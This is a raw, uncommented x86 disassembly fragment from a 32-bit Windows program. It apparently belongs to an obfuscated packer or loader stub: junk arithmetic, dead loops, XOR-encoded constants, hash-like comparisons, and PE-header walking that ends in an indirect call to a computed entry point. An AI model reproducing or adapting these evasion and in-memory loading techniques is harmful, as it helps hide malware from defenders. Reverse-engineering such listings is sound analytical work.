  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
